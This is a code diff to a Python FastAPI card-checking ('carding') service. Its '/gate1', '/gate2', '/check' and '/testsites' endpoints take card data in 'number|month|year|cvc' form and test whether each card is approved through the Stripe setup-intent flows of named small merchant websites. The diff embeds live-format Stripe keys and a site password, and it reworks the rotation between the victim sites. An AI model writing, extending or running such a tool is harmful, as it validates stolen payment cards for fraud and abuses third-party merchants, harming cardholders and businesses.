@@ -25,7 +25,7 @@ error_counters = defaultdict(lambda: {
     "error": 0
 })
 
-# Site configurations
+# Site configurations - Only 2 sites now
 SITES = {
     "reddsrestaurant": {
         "base_url": "https://reddsrestaurant.com",
@@ -37,13 +37,6 @@ SITES = {
         "base_url": "https://aestheticjourneysdesigns.com",
         "stripe_key": "pk_live_5185RlDK2SdlpCSYRF4CAg7pFKnamr2G8Z6uZIwTNc99xqg87Fn7GUCrhtdOEdYyST89TVcUd0sggbqFle7qVEakq00Ro7vdjvc",
         "requires_password": False,
-        "ajax_action": "wc_stripe_create_and_confirm_setup_intent"
-    },
-    "handtoolessentials": {
-        "base_url": "https://handtoolessentials.com",
-        "stripe_key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
-        "requires_password": True,
-        "password": "hunter321@",
         "ajax_action": "wc_stripe_create_and_confirm_setup_intent"
     }
 }
@@ -234,10 +227,15 @@ async def authorize_card_random_site(card_details: str) -> Dict:
     return await authorize_card_for_site(site_name, card_details)
 
 
+# Gate 1: Rotates between both sites (reddsrestaurant and aestheticjourneysdesigns)
 async def authorize_gate1_rotate(card_details: str) -> Tuple[str, str]:
-    """Gate 1 - Rotates between reddsrestaurant and aestheticjourneysdesigns"""
+    """
+    Gate 1 - Rotates between both sites:
+    - reddsrestaurant
+    - aestheticjourneysdesigns
+    """
     sites_to_try = ["reddsrestaurant", "aestheticjourneysdesigns"]
-    random.shuffle(sites_to_try)
+    random.shuffle(sites_to_try)  # Random rotation between the 2 sites
     
     for site_name in sites_to_try:
         site_config = SITES[site_name]
@@ -245,6 +243,7 @@ async def authorize_gate1_rotate(card_details: str) -> Tuple[str, str]:
         status, message = await api.process_payment(card_details)
         if status == "approved":
             return ("approved", f"{site_name}")
+        # If declined, continue to next site
         if status == "error":
             continue
         continue
@@ -252,11 +251,27 @@ async def authorize_gate1_rotate(card_details: str) -> Tuple[str, str]:
     return ("declined", "No site approved")
 
 
-async def authorize_gate2_fixed(card_details: str) -> Tuple[str, str]:
-    """Gate 2 - Fixed to handtoolessentials"""
-    site_config = SITES["handtoolessentials"]
-    api = SiteAuthAPI("handtoolessentials", site_config)
-    return await api.process_payment(card_details)
+# Gate 2: Also rotates between both sites but different order or fixed to one
+async def authorize_gate2_rotate(card_details: str) -> Tuple[str, str]:
+    """
+    Gate 2 - Also rotates between both sites:
+    - aestheticjourneysdesigns first, then reddsrestaurant
+    """
+    # Fixed order for Gate 2 (aesthetic first, then redds)
+    sites_to_try = ["aestheticjourneysdesigns", "reddsrestaurant"]
+    
+    for site_name in sites_to_try:
+        site_config = SITES[site_name]
+        api = SiteAuthAPI(site_name, site_config)
+        status, message = await api.process_payment(card_details)
+        if status == "approved":
+            return ("approved", f"{site_name}")
+        # If declined, continue to next site
+        if status == "error":
+            continue
+        continue
+    
+    return ("declined", "No site approved")
 
 
 async def authorize_all_sites(card_details: str) -> List[Dict]:
@@ -294,12 +309,15 @@ async def authorize_all_sites(card_details: str) -> List[Dict]:
 
 @app.get("/gate1")
 async def check_gate1(cc: str = Query(..., description="Card details in format: card_number|exp_month|exp_year|cvc")):
-    """Check card using Gate 1 (Rotates between 2 sites)"""
+    """
+    Gate 1 - Rotates between both sites (reddsrestaurant & aestheticjourneysdesigns)
+    Random rotation for each request
+    """
     async with semaphore:
         try:
             parts = cc.split('|')
             if len(parts) != 4:
-                raise HTTPException(status_code=400, detail="Invalid card format")
+                raise HTTPException(status_code=400, detail="Invalid card format. Use: number|month|year|cvc")
             
             status, message = await authorize_gate1_rotate(cc)
             
@@ -307,6 +325,7 @@ async def check_gate1(cc: str = Query(..., description="Card details in format: 
                 status_code=200,
                 content={
                     "gate": "gate1_rotating",
+                    "sites": ["reddsrestaurant", "aestheticjourneysdesigns"],
                     "status": status,
                     "response": message,
                     "card": f"{parts[0][:6]}...{parts[0][-4:]}"
@@ -320,19 +339,23 @@ async def check_gate1(cc: str = Query(..., description="Card details in format: 
 
 @app.get("/gate2")
 async def check_gate2(cc: str = Query(..., description="Card details in format: card_number|exp_month|exp_year|cvc")):
-    """Check card using Gate 2 (Fixed to handtoolessentials)"""
+    """
+    Gate 2 - Also rotates between both sites (aestheticjourneysdesigns first, then reddsrestaurant)
+    Fixed order for consistency
+    """
     async with semaphore:
         try:
             parts = cc.split('|')
             if len(parts) != 4:
-                raise HTTPException(status_code=400, detail="Invalid card format")
+                raise HTTPException(status_code=400, detail="Invalid card format. Use: number|month|year|cvc")
             
-            status, message = await authorize_gate2_fixed(cc)
+            status, message = await authorize_gate2_rotate(cc)
             
             return JSONResponse(
                 status_code=200,
                 content={
-                    "gate": "gate2_fixed",
+                    "gate": "gate2_rotating_fixed_order",
+                    "sites": ["aestheticjourneysdesigns", "reddsrestaurant"],
                     "status": status,
                     "response": message,
                     "card": f"{parts[0][:6]}...{parts[0][-4:]}"
@@ -351,7 +374,7 @@ async def check_card(cc: str = Query(..., description="Card details in format: c
         try:
             parts = cc.split('|')
             if len(parts) != 4:
-                raise HTTPException(status_code=400, detail="Invalid card format")
+                raise HTTPException(status_code=400, detail="Invalid card format. Use: number|month|year|cvc")
             
             result = await authorize_card_random_site(cc)
             
@@ -388,7 +411,7 @@ async def test_all_sites(cc: str = Query(..., description="Card details in forma
         try:
             parts = cc.split('|')
             if len(parts) != 4:
-                raise HTTPException(status_code=400, detail="Invalid card format")
+                raise HTTPException(status_code=400, detail="Invalid card format. Use: number|month|year|cvc")
             
             results = await authorize_all_sites(cc)
             
@@ -427,20 +450,36 @@ async def health_check():
         "status": "healthy",
         "max_concurrent": 50,
         "timeout_seconds": 60,
-        "sites": list(SITES.keys())
+        "sites": list(SITES.keys()),
+        "gates": {
+            "gate1": "Rotating between both sites (random order)",
+            "gate2": "Rotating between both sites (fixed order: aesthetic -> redds)"
+        }
     }
 
 
 @app.on_event("startup")
 async def startup_event():
+    print("="*60)
     print("API Started - Ready to handle requests")
-    print("Endpoints:")
-    print("  - GET /gate1?cc=card|month|year|cvc (rotating between 2 sites)")
-    print("  - GET /gate2?cc=card|month|year|cvc (fixed to handtoolessentials)")
+    print("="*60)
+    print("Configured Sites:")
+    for site in SITES.keys():
+        print(f"  - {site}")
+    print("\nGates Configuration:")
+    print("  - Gate 1: Rotates between both sites (random order)")
+    print("  - Gate 2: Rotates between both sites (aesthetic first, then redds)")
+    print("\nEndpoints:")
+    print("  - GET /gate1?cc=card|month|year|cvc")
+    print("  - GET /gate2?cc=card|month|year|cvc")
     print("  - GET /check?cc=card|month|year|cvc (random site)")
     print("  - GET /testsites?cc=card|month|year|cvc (all sites)")
     print("  - GET /error_count")
     print("  - GET /health")
+    print("="*60)
+    print(f"Max concurrent requests: 50")
+    print(f"Request timeout: 60 seconds")
+    print("="*60)
 
 
 if __name__ == "__main__":
